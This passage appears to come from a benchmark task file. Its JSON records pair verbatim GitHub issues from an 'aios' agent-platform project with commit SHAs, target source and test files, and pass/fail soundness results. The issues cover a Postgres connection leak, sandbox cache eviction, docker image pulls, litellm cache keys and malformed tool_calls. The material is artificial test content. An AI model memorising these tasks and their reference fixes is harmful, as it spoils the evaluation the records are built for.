+   "task": "config: AIOS_WORKSPACE_ROOT silently allowed to be relative \u2014 should fail-fast at Settings load\n\n## Symptom\n\n``Settings.workspace_root: Path`` in ``src/aios/config.py`` has no\nmodel_validator enforcing the absolute-path invariant the rest of the\ncodebase assumes. A misconfigured operator setting\n``AIOS_WORKSPACE_ROOT=./workspaces`` (or any other relative path) gets\nsilent CWD-dependent behavior, not a startup failure.\n\n## Concrete failure scenario\n\nOperator runs the API process from ``/home/api`` and the worker from\n``/home/worker`` (e.g. two systemd units with different\n``WorkingDirectory``, two ``uv run`` invocations in different shells).\nBoth load the same ``.env`` with ``AIOS_WORKSPACE_ROOT=./workspaces``.\n\n- ``services.create_session`` (API process) computes the default\n  ``workspace_path = workspace_root / account_id / session_id`` and\n  stores it on the row. ``workspace_root`` here resolves to\n  ``/home/api/workspaces``. Row gets\n  ``/home/api/workspaces/<acc>/<sess>``.\n- ``build_spec_from_session`` (worker process) reads the row, calls\n  ``validate_workspace_path(raw_path, account_id, session_id=session_id)``.\n  In that call ``workspace_root = settings.workspace_root.resolve()``\n  evaluates to ``/home/worker/workspaces``.\n- ``account_root = workspace_root / account_id`` \u2192\n  ``/home/worker/workspaces/<acc>``.\n- ``path = Path(raw_path).resolve()`` \u2192\n  ``/home/api/workspaces/<acc>/<sess>``.\n- ``path.is_relative_to(account_root)`` \u2192 ``False`` (different parent\n  directories).\n- Legacy carve-out also fails (resolved path doesn't match\n  ``(workspace_root / session_id).resolve()`` either).\n- ``ForbiddenError: workspace_path must resolve to within the\n  account's workspace subdirectory`` on every tool call \u2014 same surface\n  shape as #626 but a different root cause.\n\n## Why this currently doesn't bite\n\nAll current deployment paths use absolute roots:\n\n- ``src/aios/config.py:80`` default: ``Path(\"/var/lib/aios/workspaces\")``\n  (absolute)\n- ``.env.example:26``: ``AIOS_WORKSPACE_ROOT=/var/lib/aios/workspaces``\n  (absolute, illustrative)\n- ``compose.yml`` (every service): ``AIOS_WORKSPACE_ROOT:\n  ${WORKSPACE_HOST_PATH:?WORKSPACE_HOST_PATH must be an absolute path\n  \u2014 run scripts/dev-bootstrap.sh}`` (compose-level enforcement, but\n  only for compose flow)\n- Every test fixture: ``monkeypatch.setattr(settings, \"workspace_root\",\n  tmp_path)`` where ``tmp_path`` is already absolute\n\nThe fail-mode is therefore \"operator footgun\" rather than \"active bug,\"\nbut the codebase's \"fail hard, no fallbacks\" stance argues for closing\nit at config load rather than letting it slide.\n\n## Suggested fix\n\nOne model_validator on ``Settings`` in ``src/aios/config.py``:\n\n```python\n@model_validator(mode=\"after\")\ndef _require_absolute_workspace_root(self) -> \"Settings\":\n    if not self.workspace_root.is_absolute():\n        raise ValueError(\n            \"AIOS_WORKSPACE_ROOT must be an absolute path; got \"\n            f\"{self.workspace_root!r}\"\n        )\n    return self\n```\n\nCould also unconditionally call ``.resolve()`` at load time so the\nworker and API see the same string regardless of CWD; the validator\ncatches the misconfiguration class, ``.resolve()`` insulates against\nthe CWD-drift class. Both together are belt-and-suspenders; the\nvalidator alone is the minimal correct-by-construction fix.\n\n## Related\n\nSurfaced during code-review of PR #628. Not introduced by that PR\n(both pre- and post-PR code call ``.resolve()`` on ``workspace_root``\nat call time, so the CWD-drift exposure is identical). Filing\nseparately because the fix is in ``config.py``, not the path validator.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "29a78eef9fb37044d72a0191388a5ace94e92083",
+   "merge_sha": "e9a23a62c582655bd825cb52c66172910e49e558",
+   "src_files": [
+    "src/aios/config.py"
+   ],
+   "test_files": [
+    "tests/unit/test_config.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "multi-attempt",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (2 failed, 2 passed in 0.31s))"
+  },
+  {
+   "id": "s20",
+   "pr": 609,
+   "issue": 606,
+   "task": "fix: asyncio.shield(conn.close()) in listen_for_* (cancellation-during-close leak)\n\n## Background\n\naios-api Postgres connection pool exhausted at **2026-05-21T01:44:49Z**, taking signal+telegram connectors offline. Tom's messages to ultron-metals stopped flowing into the session event log. Outage lasted ~2h45m until chief-of-staff restarted aios-api at 04:23Z.\n\nThis is a follow-up to aios#502 (the May 16 close-on-add_listener-failure fix) \u2014 that addressed one leak surface; today's outage shows the cleanup path on normal cancellation wasn't touched and still leaks.\n\n### Trigger sequence (forensic, from container logs)\n\n1. **aios-api last restarted** at 2026-05-20T22:31:46Z (6h uptime by crash).\n2. **First `TooManyConnectionsError`** at 2026-05-21T01:44:49Z in `listen_for_connector_calls_by_type` (`src/aios/db/listen.py:190` \u2192 invoked by `src/aios/api/sse.py:163` for `/v1/connectors/runtime/connector-calls`).\n3. From 01:44Z onward, every SSE-stream reconnect from signal-cli and telegram connectors hit the same error every 60s (their stream-retry backoff). Loop:\n   ```\n   connector.tool_loop.stream_error backoff=60.0 error='Server disconnected without sending a response.'\n   connector.management_loop.stream_error backoff=60.0 error='Server disconnected without sending a response.'\n   connector.discovery.stream_error backoff=60.0 error='Server disconnected without sending a response.'\n   ```\n4. Tom sent \"still there?\" to ultron via signal at 04:19:59Z. Signal-cli received it (visible in connector logs). But the connector couldn't deliver it to aios because all SSE-based event-write paths were broken.\n5. Restart at 04:23Z cleared aios-api's share of the pool. Signal connector's next backoff retry succeeded. Ultron sent its first DM at 04:26:02Z.\n\n### Leak-rate observations\n\n- aios-api uptime ~6h to first crash; cap hit at ~75-80 conns of leak above baseline \u2192 ~12-13 conns/hr accumulation.\n- Post-restart at 04:23Z, aios-api at 10 conns (baseline). 10 min later: 14 conns. Suggests leak is ongoing if unfixed (~24 conns/hr extrapolated; another ~3 hours to re-saturate). The aios-worker's 10 conns are a stable procrastinate pool, NOT leaking \u2014 initial 6h-idle-since-state_change reading was a red herring (these are pool conns reused infrequently).\n- Postgres `max_connections=100`. Baseline ~25 (worker pool + api pool + 6 normal LISTEN conns for signal+telegram \u00d7 3 channels each). Headroom: ~75. Crossed at 01:44Z.\n\n## Root cause\n\n`src/aios/db/listen.py` has 5 `@asynccontextmanager` functions, each opening a dedicated `asyncpg.connect()` and cleaning up in a `finally` block:\n\n| Function | Line | Purpose |\n|---|---|---|\n| `listen_for_connector_result` | 74 | per `call_id` (tool-result wait) |\n| `listen_for_events` | 120 | per session_id (consumer SSE stream) |\n| `listen_for_connector_calls_by_type` | 190 | per connector type (tool stream) |\n| `listen_for_management_calls` | 240 | per connector type (management stream) |\n| `listen_for_connection_discovery` | 284 | per connector type (discovery stream) |\n\nAll five have this cleanup pattern (example from `listen_for_connector_calls_by_type` around line 184-186):\n\n```python\nfinally:\n    with contextlib.suppress(Exception):\n        await conn.close()\n```\n\n**The bug**: `contextlib.suppress(Exception)` does NOT catch `BaseException`, and since Python 3.8, `asyncio.CancelledError` extends `BaseException` (not `Exception`) \u2014 see [the bpo-32528 change](https://bugs.python.org/issue32528). When sse-starlette cancels the generator on client disconnect, `CancelledError` propagates into the `finally` clause. The `await conn.close()` is itself an awaitable \u2014 and once the task has been cancelled, the next `await` re-raises `CancelledError` before asyncpg's close protocol (Terminate message + transport.close()) completes. The Postgres backend lingers until TCP keepalive eventually reaps it (default ~2h on most distros), which fits the 6h-to-saturation timeline.\n\n## Fix\n\nWrap the close in `asyncio.shield()` so the close protocol completes even if the outer task is cancelled:\n\n```python\nfinally:\n    with contextlib.suppress(Exception):\n        await asyncio.shield(conn.close())\n```\n\n`asyncio.shield` protects the inner coroutine from the inbound cancellation; the outer task still surfaces the `CancelledError` to its caller, but the close completes asynchronously in the background. asyncpg gets to send Terminate before the connection is dropped, and Postgres reaps the backend immediately.\n\nApply to all 5 sites in `src/aios/db/listen.py`. One-line change each.\n\n## Acceptance\n\nIntegration test demonstrates the leak fails before the patch and passes after:\n\n1. Test opens N SSE streams against the live API (any of the 4 endpoints \u2014 `connector-calls`, `management`, `discovery`, `session-events`).\n2. Test cancels the SSE consumers mid-stream (simulating client disconnect).\n3. Test asserts `pg_stat_activity` connection count returns to baseline within a small grace window (e.g., 2s).\n\nThe test must FAIL on master pre-patch and PASS post-patch. This is the load-bearing acceptance \u2014 without it, the fix isn't proven against the actual cancellation path.\n\n## Files to read\n\n- `src/aios/db/listen.py` (the 5 listen-for functions \u2014 same finally pattern in each)\n- `src/aios/api/sse.py` (the SSE handlers that drive these \u2014 for the e2e test setup)\n- `src/aios/db/pool.py` (for the existing pool helper \u2014 not modified, just referenced)\n\n## Files to modify\n\n- `src/aios/db/listen.py` (the 5 sites \u2014 add `asyncio.shield(...)`)\n- `tests/integration/test_listen_cancellation.py` (new file \u2014 the acceptance test)\n\n## Residual caveats\n\n- **`asyncio.shield` and `contextlib.suppress` interaction**: when the outer task is cancelled, `await asyncio.shield(conn.close())` raises `CancelledError` to the outer try/except. But `contextlib.suppress(Exception)` doesn't catch `CancelledError` (same root issue), so the `CancelledError` still propagates from the `finally` clause \u2014 which is fine because that matches the intended Python cancellation semantics (cleanup completes, cancellation continues to caller). The shielded inner `conn.close()` keeps running in the background regardless and reaches asyncpg's Terminate write. Confirm in the test by asserting the conn is gone server-side, NOT by inspecting client-side behavior.\n- **No `idle_in_transaction_session_timeout` change, no `max_connections` bump, no LISTEN-pool refactor.** Those were earlier-proposed mitigations whose necessity is moot if the shield fix works (confirmed by the acceptance test). If the fix turns out to be incomplete, revisit; until then, the simpler ground-truth fix wins.\n- **Observability is split into a separate ticket.** See \"Related\" below.\n\n## Related\n\n- **aios#502** \u2014 the May 16 close-on-add_listener-failure fix. Different leak surface (failure-during-listener-setup); doesn't address the cancellation-during-normal-cleanup path that bit us today.\n- **eumemic-ops#65** \u2014 independent observability followup: audit check `postgres-pool-saturation.sh` that asserts pool below 75% warn / 90% fail. Stays open regardless of how this fix lands \u2014 the audit gap (detecting saturation BEFORE Postgres refuses) is independently valuable.\n- **Symptom timeline + recovery** documented in chief-of-staff session 2026-05-21T04:23Z. Restart of aios-api container recovered service in <1 min; signal connector reconnected on its next 60s retry; ultron sent first DM at 04:26:02Z.\n\n## Out of scope (do not in-scope here)\n\n- `idle_in_transaction_session_timeout` Pg config tuning.\n- Bumping `max_connections` 100 \u2192 200.\n- Replacing `asyncpg.connect()` with pooled acquisition in `db/listen.py`.\n- A `/admin/metrics/db-pool` endpoint.\n\nAll four were proposed in an earlier version of this issue and have been deliberately scoped out. If the shield fix proves insufficient, file them as separate followups with that surface as evidence.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "0d8d7c3e188240d36e8acca15d66ac6f2cceba48",
+   "merge_sha": "a8b7ff0cb349f1b016861fba6137ac641b8f57b3",
+   "src_files": [
+    "src/aios/db/listen.py"
+   ],
+   "test_files": [
+    "tests/unit/test_listen.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (6 failed in 0.42s))"
+  },
+  {
+   "id": "s22",
+   "pr": 569,
+   "issue": 566,
+   "task": "SandboxRegistry doesn't evict cached handle synchronously on idle_release \u2014 first bash call after idle fails with 'No such container'\n\n## Verified observation (2026-05-20)\n\n`SandboxRegistry` caches a session's `SandboxHandle` in memory. When the container backing that handle dies via a path the registry isn't on the synchronous error path for, the cache becomes stale and the **next bash call fails with `Error response from daemon: No such container: <hash>`** before the eviction hook fires.\n\nTwo concrete production paths that triggered this today:\n\n1. **`idle_release` reaper kills the container + registry handle SHOULD be evicted, but isn't.**\n   - 18:10:54: `sandbox.idle_release` fired for session `sess_01KQ8NQ3HP4XB9D0F4GW9JKYWF` after 5 min inactivity\n   - `sandbox.destroyed` for `303f860045c3` immediately after\n   - Next bash call: registry exec'd into 303f8600... \u2192 \"No such container\"\n   - Tool result: docker error visible to the model\n   - `tool_dispatch._evict_session_container` fires on the resulting exception \u2192 evicts the cached handle\n   - Second bash call: cache miss \u2192 provisions fresh sandbox \u2192 works\n\n2. **Manual `docker stop <sandbox-name>` (per aios#390's \"recycle\" runbook).**\n   - Same shape: registry doesn't know about external stop\n   - First bash after stop sees stale handle \u2192 fails\n   - Second bash succeeds\n\n## Why it matters\n\nUser-visible flake. A chat-pattern session (operator pauses to compose long messages between tool calls) hits this every time the idle TTL expires. The first bash after a thinking pause fails with a confusing docker error; the user reports \"broken sandbox\"; the second call works fine.\n\nTriggering Ultron incident 2026-05-20: 5 of his Signal DMs over ~10 min reported \"No such container\" errors. The fix this turn was bumping `AIOS_CONTAINER_IDLE_TIMEOUT_SECONDS` from 300 to 1800 (workaround \u2014 papers over but doesn't fix the bug).\n\n## Implementation\n\n`SandboxRegistry.idle_release` (or whatever method destroys the container) MUST evict the in-memory cache for that session_id at the same point it destroys the container \u2014 same transaction, not via a separate exception hook on the next call.\n\nSketch (`src/aios/sandbox/registry.py`):\n\n```python\nasync def _idle_release(self, session_id: str) -> None:\n    handle = self._cache.get(session_id)\n    if handle is None:\n        return\n    log.info(\"sandbox.idle_release\", session_id=session_id)\n    # CRITICAL: evict BEFORE destroy, not after. Otherwise a concurrent\n    # tool call can grab the about-to-be-destroyed handle.\n    self._cache.pop(session_id, None)\n    await self._backend.destroy(handle)\n```\n\nFor path #2 (external `docker stop`), the registry can poll `docker inspect <handle.container_id>` cheaply before returning the handle \u2014 if container is gone, evict + re-provision. Adds latency to every tool call (~50ms), so prefer the explicit-eviction-on-known-destroys path. External `docker stop` is operator-action and rare; doc the \"after manual stop, expect one failed call before recovery\" in `feedback_aios_promote_lockstep` or aios#390's runbook.\n\n## Test strategy\n\nUnit test for the registry: mock the backend's destroy; assert cache is empty AFTER idle_release returns; assert next `get` call provisions fresh instead of returning stale handle.\n\nIntegration test: spawn a session, force idle_release via test hook, immediately call a bash tool, assert it succeeds (not \"No such container\").\n\n## Acceptance criteria\n\n1. `idle_release` evicts cache synchronously before destroying the container.\n2. New unit test covers the eviction order.\n3. Manual reproduction: provision sandbox, wait for idle_release, call bash \u2014 should succeed on first attempt (not require a sacrificial first failure).\n4. The default `container_idle_timeout_seconds=300` becomes safe again; operator can revert the workaround value on aios-worker.\n\n## Related\n\n- aios#390 \u2014 sandbox image staleness (different problem, same lifecycle area)\n- The 2026-05-20 Ultron incident \u2014 root cause for filing this issue\n- `AIOS_CONTAINER_IDLE_TIMEOUT_SECONDS=1800` workaround applied on aios-worker \u2014 revert to 300 (default) after this lands",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "23263457b02f44f867dc660397f5385ba9778fe1",
+   "merge_sha": "a856df845da6818e4f10b52360fae487a9a2ca37",
+   "src_files": [
+    "src/aios/sandbox/registry.py"
+   ],
+   "test_files": [
+    "tests/unit/test_sandbox_reaper.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (1 failed, 3 passed in 0.57s))"
+  },
+  {
+   "id": "s23",
+   "pr": 568,
+   "issue": 567,
+   "task": "Sandbox spawn doesn't pull on mutable :stable tag \u2014 :stable promotions don't reach running sessions until manual docker pull\n\n## Verified observation (2026-05-20)\n\nWhen `promote-sandbox.yml` retags `:smoked` \u2192 `:stable` on the GHCR registry, **the new image digest is NOT picked up by `docker run ghcr.io/eumemic/aios-sandbox:stable`** on Server B until an explicit `docker pull` happens.\n\nReproduced today:\n\n1. `build-sandbox.yml` ran 2026-05-20 17:49Z, built new image with the aios#563 `bin/mcp` UDS support\n2. `promote-sandbox.yml` retagged `:smoked` \u2192 `:stable` at 17:50Z\n3. `aios-worker` provisioned a new sandbox (practical_newton) at 17:59:35 \u2014 used the LOCAL CACHED `:stable` image, digest `b5ea8b4542e5...` (the OLD one)\n4. `mcp` inside that sandbox still failed with `unknown url type: unix` (old binary)\n5. Manual `docker pull ghcr.io/eumemic/aios-sandbox:stable` on Server B \u2192 digest updated to `9145c650c0b6...`\n6. Next sandbox provision picked up new image; `mcp` works end-to-end\n\n## Why it matters\n\n`:stable` is the Track R promotion lever for the sandbox image. Today, Track R promotions don't actually reach running aios sessions \u2014 they retag in the registry but local Docker caches are stale until someone explicitly pulls. The image-update mechanism is broken in production.\n\nCompounds with aios#390 (sandbox image staleness for long-running sessions) \u2014 even if a session recycles its sandbox, the new sandbox uses the cached image, so the recycle doesn't deliver the new substrate.\n\n## Implementation options\n\n### Option A (preferred): `--pull always` on sandbox `docker run` invocation\n\n`aios.sandbox.backends.docker` invokes `docker run ...` (or equivalent) to spawn sandboxes. Add `--pull always` to that command line. Docker will check the registry for a newer digest on every spawn. Trade-off: ~200-500ms added to first spawn after a tag update; subsequent spawns hit local cache and are fast.\n\n### Option B: explicit `docker pull` triggered by promote-sandbox\n\n`promote-sandbox.yml` (in `eumemic/aios`) extends its workflow to ssh into each worker host and run `docker pull ghcr.io/eumemic/aios-sandbox:stable`. Cleaner separation (deploy-gate concern), but adds SSH-in-CI surface (per `feedback_deploy_gates_vs_audit` memory, this is the boundary we've been trying to avoid).\n\n### Option C: aios-worker background task that polls `:stable` digest\n\naios-worker subscribes to \"image updated\" events (poll the registry for `:stable` digest every N min; pull when changed). More moving parts but no SSH-in-CI.\n\n**Recommend Option A.** Simplest, smallest blast radius, integrates with existing sandbox-spawn code. The latency cost is only on the FIRST sandbox after a tag move; steady state is unchanged.\n\n## Implementation sketch\n\n`src/aios/sandbox/backends/docker.py`, in the `docker run` invocation, add:\n\n```python\ncmd = [\n    \"docker\", \"run\",\n    \"--pull\", \"always\",  # \u2190 NEW: ensures :stable is fresh\n    ...\n]\n```\n\nOr equivalent if using docker SDK instead of subprocess.\n\n## Test strategy\n\nHard to unit-test without integration (depends on docker daemon). Acceptance is structural: the `--pull always` flag is present in the spawn command, and a manual test (retag `:stable` to a different SHA \u2192 spawn a new session \u2192 confirm it uses new image) works.\n\n## Acceptance criteria\n\n1. Sandbox spawns include `--pull always` (or equivalent policy).\n2. Manual reproduction: rebuild + retag `:stable` \u2192 next sandbox spawn picks up new digest without manual `docker pull`.\n3. Subsequent spawns (same `:stable` digest) don't pay the pull cost (docker daemon's \"already have it\" optimization).\n4. Track R promotions become a real lever for image updates on running aios-worker hosts.\n\n## Out of scope\n\n- Pulling on a schedule (Option C) \u2014 defer; Option A is sufficient\n- Generalizing to other apps (aios-api, aios-worker themselves) \u2014 they use Coolify's pull-and-rebuild model, different flow\n\n## Related\n\n- aios#390 \u2014 sandbox image staleness (related; this issue makes that one's \"Option 2: refresh on :stable promotion\" actually work)\n- aios#563 (MCP UDS \u2014 merged); 2026-05-20 took ~30 min to fully roll out partly because of this issue\n- Track R promotion pattern (eumemic-ops#4, etc.) \u2014 the deploy-gate stack relies on this working",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "a856df845da6818e4f10b52360fae487a9a2ca37",
+   "merge_sha": "14b1656dfa37caf79073ff8030e29952b01c5685",
+   "src_files": [
+    "src/aios/sandbox/backends/docker.py"
+   ],
+   "test_files": [
+    "tests/unit/test_sandbox_pull_always.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (3 failed, 2 passed in 0.29s))"
+  },
+  {
+   "id": "s24",
+   "pr": 559,
+   "issue": 558,
+   "task": "aios#556 cache fix: kwargs[prompt_cache_key] is silently dropped by litellm \u2014 use extra_body\n\n## Verified observation (2026-05-20 06:14 UTC)\n\naios#556 merged and deployed (commit `5bac6e3` now on aios-api and aios-worker). It adds `kwargs[\"prompt_cache_key\"] = session_id` in `src/aios/harness/completion.py` to enable OpenAI prefix caching on the openai-provider path.\n\n**The cache_key never reaches the upstream.** Verified via oai-proxy's request dumps:\n\n- Test 1 \u2014 `kwargs[\"prompt_cache_key\"]` (the current implementation):\n  ```bash\n  litellm.completion(model=\"openai/gpt-5.5\", messages=[...], prompt_cache_key=\"...\", ...)\n  ```\n  oai-proxy dump's `request.json` contains ONLY `{messages, model}` \u2014 NO `prompt_cache_key`.\n\n- Test 2 \u2014 `extra_body={\"prompt_cache_key\": ...}`:\n  ```bash\n  litellm.completion(model=\"openai/gpt-5.5\", messages=[...], extra_body={\"prompt_cache_key\": \"...\"}, ...)\n  ```\n  oai-proxy dump's `request.json` contains `{\"messages\": [...], \"model\": \"gpt-5.5\", \"prompt_cache_key\": \"marker-via-extra-body-20260520\"}` \u2014 PROPAGATES.\n\n**Mechanism (verified)**: litellm filters unknown kwargs out of the final HTTP body sent to the openai provider. `prompt_cache_key` is not a documented field on `/v1/chat/completions` so litellm doesn't include it. The `extra_body` channel is the documented mechanism for passing through non-standard fields untouched.\n\n## Why aios#556's tests didn't catch this\n\nThe PR's unit tests assert that `prompt_cache_key=session_id` is PASSED TO `litellm.completion(...)` (mocked). They don't assert it reaches the upstream HTTP body. The test passes; the behavior fails.\n\nThis is the **test-layer-alignment** pattern from project memory: \"write tests at the LOWEST layer where the bug would live.\" This bug lives at the HTTP wire, not at the kwargs boundary.\n\n## Validation experiment (2026-05-20)\n\nEnd-to-end cache rate measurement after #556 deploy:\n\n- Sent 5 openai/gpt-5.5 requests (1025 input tokens each, 5125 total) via `aios.harness.completion.call_litellm` with stable session_id\n- oai-proxy admin endpoint reported: `totalInputTokens=5125, totalCacheReadInputTokens=0, totalCacheCreationInputTokens=0`\n- Expected after fix: cache_read > 0 on subsequent turns with the same prefix\n- Observed: 0 cache reads (matches the pre-fix behavior)\n\nThe fix structurally cannot work as written.\n\n## Implementation\n\nIn `src/aios/harness/completion.py`, change the OpenAI branch from:\n\n```python\nif _supports_openai_prompt_cache_key(model):\n    kwargs[\"prompt_cache_key\"] = session_id\n```\n\nto:\n\n```python\nif _supports_openai_prompt_cache_key(model):\n    kwargs.setdefault(\"extra_body\", {})[\"prompt_cache_key\"] = session_id\n```\n\nThe `setdefault` is important \u2014 preserves any other `extra_body` fields a caller may have already set.\n\n## Test strategy (LOWEST LAYER per test-layer-alignment)\n\nThe existing unit tests assert against the kwargs boundary \u2014 keep those. ADD an integration-shaped test that verifies the field reaches the HTTP body:\n\n```python\ndef test_prompt_cache_key_reaches_upstream_body(monkeypatch):\n    \"\"\"The cache_key must end up in the JSON body the openai provider sends \u2014 not\n    just in the kwargs we pass to litellm.completion.\"\"\"\n    captured = {}\n    def fake_httpx_post(url, json=None, **kw):\n        captured[\"url\"] = url\n        captured[\"body\"] = json\n        # ... return a minimal valid response\n    monkeypatch.setattr(\"httpx.Client.post\", fake_httpx_post)  # or wherever litellm makes the call\n\n    asyncio.run(call_litellm(\n        model=\"openai/gpt-5.5\",\n        messages=[{\"role\": \"user\", \"content\": \"hi\"}],\n        session_id=\"test-session-123\",\n    ))\n    assert captured[\"body\"][\"prompt_cache_key\"] == \"test-session-123\"\n```\n\nWithout this test, the next \"fix\" could silently regress the same way. With it, the boundary is asserted.\n\n## Acceptance criteria\n\n1. `extra_body[\"prompt_cache_key\"]` is set on openai-provider completions when session_id is non-null.\n2. A real openai/gpt-5.5 request via the aios harness shows `prompt_cache_key` in oai-proxy's `/data/dumps/*/request.json` upstream body.\n3. The new integration test fails on the current main and passes after the fix.\n4. End-to-end cache rate measurement after deploy: multi-turn sessions on openai/gpt-5.5 show `cache_read_input_tokens > 0` on turn 2+.\n\n## Related\n\n- **aios#556** \u2014 the fix this issue is fixing. Don't revert; just amend.\n- **aios#538** \u2014 the original cache investigation; subagent's narrow refutation was correct but missed the broader bug (gate was off entirely). This PR fully closes #538 once the new fix lands and validation shows cache_read > 0.\n- **`feedback_test_layer_alignment`** memory \u2014 write tests at the LOWEST layer where the bug would live. Unit-testing the kwargs boundary can't catch a wire-level strip.\n- **`feedback_no_narrative_before_evidence`** memory \u2014 the prior #538 investigation refuted the narrow hypothesis with verified evidence but the *implementation* wasn't validated by a wire-level test; the gap is exactly the kind of evidence-vs-narrative miss that bites at production.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "5bac6e3594afe1f3416b3a42be8ade453bdaceaf",
+   "merge_sha": "7ca5736b6a28a0b7d7478b29f9439e6e51afd22b",
+   "src_files": [
+    "src/aios/harness/completion.py"
+   ],
+   "test_files": [
+    "tests/unit/test_completion_prompt_cache_key.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (4 failed, 3 passed in 1.12s))"
+  },
+  {
+   "id": "s25",
+   "pr": 438,
+   "issue": 435,
+   "task": "Malformed tool_calls survive sanitization with empty id, may produce invalid provider payloads\n\n## Background\n\nSurfaced during code review of PR #434 (\\`fix(harness/context): drop leading assistant with unjoinable tool_calls\\`).\n\nPR #434 fixed a \\`KeyError: 'id'\\` crash in \\`_prune_leading_orphans\\` and now drops a leading assistant whose tool_calls are all unjoinable (missing/empty \\`id\\`). The leading-orphan case is unstuck. But the same malformed shape sitting **mid-window** still survives:\n\n1. ``build_messages`` main loop (``context.py:519-548``) iterates the assistant event and appends it to ``messages`` regardless of tool_call validity (line 536: ``messages.append(e.data)``). The subsequent loop over ``tool_calls`` (lines 538-549) skips emitting paired tool-result placeholders for entries with no ``id`` (line 540: ``if not tcid or tcid in emitted_tcids: continue``) but the assistant message itself still carries the malformed entries in its ``tool_calls`` array.\n2. ``_strip_to_spec`` \u2192 ``_sanitize_tool_calls`` (``context.py:355-383``) normalizes each entry to ``{\\\"id\\\": tc.get(\\\"id\\\") or \\\"\\\", \\\"type\\\": \\\"function\\\", \\\"function\\\": {...}}`` \u2014 i.e., preserves the malformed entry with an **empty-string id** rather than dropping it.\n3. The final assembled context contains an ``assistant`` message with one or more ``{\\\"id\\\": \\\"\\\", ...}`` tool_calls that have no corresponding ``tool``-role message following. That shape is **invalid per the chat-completions schema** for tool-use and strict providers (Anthropic via LiteLLM, OpenAI) may reject the request.\n\n## Why this matters\n\nIf the model produces a malformed tool_call mid-window, the session may now repeatedly fail the next provider call with a 400 instead of crashing on prune. Symptom is similar to the wedged-session bug PR #434 fixed (session retries on deterministic state until budget exhausts), just via a different failure mode.\n\n## The right fix is uncertain \u2014 needs an audit\n\nTwo candidate fix locations:\n\n**(a) ``_sanitize_tool_calls``** \u2014 drop entries whose ``id`` is empty/missing rather than preserving them with empty-string ids. Most localized; affects every render site uniformly.\n   - Risk: changes the semantics of \\`_sanitize_tool_calls\\` from \\\"normalize to structurally-valid\\\" to \\\"normalize + filter\\\". Need to check whether any caller relies on the array-length being preserved (e.g., index-correlated state elsewhere).\n\n**(b) Event-write time** \u2014 refuse to persist assistant events whose ``tool_calls`` contain malformed entries; either sanitize on the way in, or fail the model call.\n   - Risk: loses replay fidelity for the original model output; harder to reproduce/diagnose issues from event log alone.\n\n## Open questions\n\n1. **Empirical reachability**: how often do real models actually produce tool_calls without ``id``? The ``_sanitize_tool_calls`` docstring claims they do, but the failure mode has been masked by either (i) the prune crash absorbing the leading case (now fixed), (ii) provider tolerance for empty-string ids, or (iii) low frequency. Need to find a real incident before choosing a fix.\n2. **Provider behavior**: does LiteLLM's translation layer reject empty-id tool_calls before the request hits the provider, or does it pass through and let the provider 400?\n3. **Cross-cutting test coverage**: PR #434's test only covers leading-orphan. A mid-window malformed shape would need its own test (likely both unit-level on ``build_messages`` and an e2e test that round-trips the malformed shape past LiteLLM).\n\n## Acceptance criteria\n\n- Empirical answer to question 2 (provider behavior with empty-id tool_calls \u2014 at minimum for Anthropic, OpenAI, and the OpenRouter Anthropic proxy).\n- Fix at the chosen layer (a) or (b), with a passing test that covers the **mid-window** malformed case.\n- Document the decision: why this layer over the alternative.\n\n## Related\n\n- PR #434 \u2014 \\`fix(harness/context): drop leading assistant with unjoinable tool_calls\\` (fixed the leading-orphan ``KeyError``)\n- The ``_sanitize_tool_calls`` docstring at ``src/aios/harness/context.py:355-362`` documents the upstream cause (\\\"some models produce malformed tool_calls ... missing fields\\\").",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "0c431ac99e2f15cb8443a12d046f2fb1ca2fdbd2",
+   "merge_sha": "6af2994b3d4c8a3cd4a3b1081c341124c5a54335",
+   "src_files": [
+    "src/aios/harness/context.py"
+   ],
+   "test_files": [
+    "tests/unit/test_context.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (3 failed, 81 passed in 1.10s))"
+  },
+  {
+   "id": "s26",
+   "pr": 429,
+   "issue": 425,
+   "task": "anyio cross-task cancel-scope error on worker shutdown via McpSessionPool.close_all\n\n## Symptom\n\nEvery clean worker shutdown raises this in the SIGTERM-shutdown window:\n\n\\`\\`\\`\nRuntimeError: Attempted to exit cancel scope in a different task than it was entered in\n  File \\\"src/aios/mcp/pool.py:159\\\", in close_all\n    await entry.close()\n  File \\\"src/aios/mcp/pool.py:69\\\", in close\n    await self._stack.aclose()\n\\`\\`\\`\n\nSurfaced as the \\\"separable side observation\\\" in #298. Not user-visible \u2014 the worker still tears down cleanly \u2014 but pollutes logs and tripped the smoke setup script's startup-error grep (fix landed in #420).\n\n## Root cause\n\n`McpSessionPool._open_entry` constructs an `AsyncExitStack` and enters async contexts in **task A** (whichever asyncio task first calls `get_or_connect` for that key). The stack is then held on the pool's `_Entry`. At worker shutdown, `close_all` runs in a different task (whichever task is wired to SIGTERM handling), iterates entries, and calls `entry.close()` \u2192 `self._stack.aclose()`.\n\nanyio's `streamable_http_client` (used in `_open_entry` via the MCP SDK) opens a cancel scope tied to task A. anyio enforces that the scope must be exited in the same task it was entered in. Cross-task aclose raises.\n\n`AsyncExitStack` is the wrong primitive for cross-task lifetime here \u2014 its async context exits run in whatever task happens to call `aclose`, not the task that opened them.\n\n## Fixes (sketched, not committed)\n\n1. **Owner-task model**: each `_Entry` owns a dedicated long-lived task. `_open_entry` spawns the task; the task enters the contexts in the stack, then 